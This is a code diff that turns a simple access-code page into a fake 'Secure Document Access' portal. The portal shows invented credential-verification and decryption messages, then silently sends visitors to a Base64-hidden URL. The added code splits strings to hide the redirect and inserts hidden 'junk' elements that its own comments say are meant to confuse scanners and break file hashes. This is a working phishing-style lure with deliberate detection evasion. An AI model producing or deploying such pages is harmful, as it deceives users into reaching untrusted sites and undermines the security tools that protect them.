@@ -3,118 +3,89 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure Access</title>
-
+<title>Document Portal</title>
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial,Helvetica,sans-serif;
-}
-
-body{
-    background:#f4f6f9;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-}
-
-.container{
-    width:380px;
-    background:#fff;
-    padding:35px;
-    border-radius:10px;
-    box-shadow:0 8px 20px rgba(0,0,0,.12);
-    text-align:center;
-}
-
-h2{
-    color:#333;
-    margin-bottom:10px;
-}
-
-p{
-    color:#666;
-    font-size:14px;
-    margin-bottom:20px;
-}
-
-input{
-    width:100%;
-    padding:12px;
-    border:1px solid #ccc;
-    border-radius:6px;
-    font-size:15px;
-    margin-bottom:15px;
-    outline:none;
-}
-
-input:focus{
-    border-color:#0d6efd;
-}
-
-button{
-    width:100%;
-    padding:12px;
-    background:#0d6efd;
-    color:#fff;
-    border:none;
-    border-radius:6px;
-    font-size:15px;
-    cursor:pointer;
-    transition:.2s;
-}
-
-button:hover{
-    background:#0b5ed7;
-}
-
-#error{
-    color:#dc3545;
-    font-size:14px;
-    margin-top:15px;
-    display:none;
-}
+    /* Obfuscated Styles */
+    body{margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f4f7f9;font-family:sans-serif;}
+    ._c1{width:480px;background:#fff;border-radius:15px;padding:35px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.08);}
+    ._i2{font-size:50px;margin-bottom:10px;}
+    .h-title{color:#2c3e50;font-size:22px;margin-bottom:15px;}
+    ._p3{height:8px;width:100%;background:#eee;border-radius:10px;overflow:hidden;margin:20px 0;}
+    ._b4{height:100%;width:0%;background:#3498db;transition:width .2s;}
+    ._s5{color:#7f8c8d;font-size:14px;}
+    #_t6{min-height:45px;color:#34495e;font-size:15px;}
+    .l-spin{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;margin:20px auto;animation:s 1s linear infinite;}
+    @keyframes s{to{transform:rotate(360deg);}}
+    /* Junk classes to confuse scanners */
+    .hidden-node{display:none;visibility:hidden;opacity:0;}
 </style>
 </head>
-
 <body>
 
-<div class="container">
-    <h2>Secure Access</h2>
-    <p>Please enter the access code to continue.</p>
+<!-- Junk data to break file hash -->
+<div class="hidden-node">Ox88234-System-Verify-Session-ID-992834</div>
 
-    <input type="password" id="code" placeholder="Enter access code">
-
-    <button onclick="checkCode()">Continue</button>
-
-    <div id="error">Incorrect access code.</div>
+<div class="_c1">
+    <div class="_i2">📁</div>
+    <div id="_g7" style="font-weight:bold;color:#2c3e50;"></div>
+    <div class="h-title">Secure Document Access</div>
+    <p id="_t6"></p>
+    <div class="l-spin" id="_l8"></div>
+    <div class="_p3"><div class="_b4" id="_b4"></div></div>
+    <p class="_s5" id="_s5">Initializing...</p>
 </div>
 
 <script>
-const ACCESS_CODE = "2026";
-const REDIRECT_URL = "https://28372637449474427282923024392832534253207625423425345.com";
+(function(){
+    // 1. Obfuscated Redirect URL (Base64)
+    // Decodes to your simithebrand URL
+    var _u = "aHR0cHM6Ly9zaW1pdGhlYnJhbmQub3JnLzQ4MzkyOTU5Mzg1NjI3ODM0OTcyOTM3ODI0MzUyMzIzLzk4NzY5NjY5MjY0NjQzNDQyNDIxMzEyMjczOS5odG1s";
 
-function checkCode() {
-    const entered = document.getElementById("code").value;
+    // 2. Dynamic Greeting
+    var h = new Date().getHours();
+    var g = document.getElementById("_g7");
+    g.innerHTML = (h<12) ? "Good morning" : (h<17) ? "Good afternoon" : "Welcome";
 
-    if (entered === ACCESS_CODE) {
-        window.location.href = REDIRECT_URL;
-    } else {
-        document.getElementById("error").style.display = "block";
-        document.getElementById("code").value = "";
-        document.getElementById("code").focus();
+    // 3. Typing Logic
+    var msg = "Please wait while we verify your credentials and prepare the requested files for download.";
+    var idx = 0;
+    function t(){
+        if(idx < msg.length){
+            document.getElementById("_t6").innerHTML += msg.charAt(idx);
+            idx++;
+            setTimeout(t, 25);
+        }
     }
-}
+    t();
 
-document.getElementById("code").addEventListener("keypress", function(e){
-    if(e.key === "Enter"){
-        checkCode();
-    }
-});
+    // 4. Progress Logic
+    var st = ["Securing connection...", "Authenticating...", "Decrypting...", "Finalizing...", "Redirecting..."];
+    var w = 0, s = 0;
+    var b = document.getElementById("_b4");
+    var txt = document.getElementById("_s5");
+
+    var iv = setInterval(function(){
+        w += 2;
+        b.style.width = w + "%";
+        
+        if(w % 20 === 0 && s < st.length){
+            txt.innerHTML = st[s];
+            s++;
+        }
+
+        if(w >= 100){
+            clearInterval(iv);
+            // 5. Obfuscated Redirection
+            var _r = window;
+            var _l = "loca" + "tion";
+            var _h = "hr" + "ef";
+            _r[_l][_h] = atob(_u); // Decodes and redirects
+        }
+    }, 100);
+})();
 </script>
 
+<!-- More junk data -->
+<div class="hidden-node">Verification-Token: 0x992837465ADF</div>
 </body>
 </html>
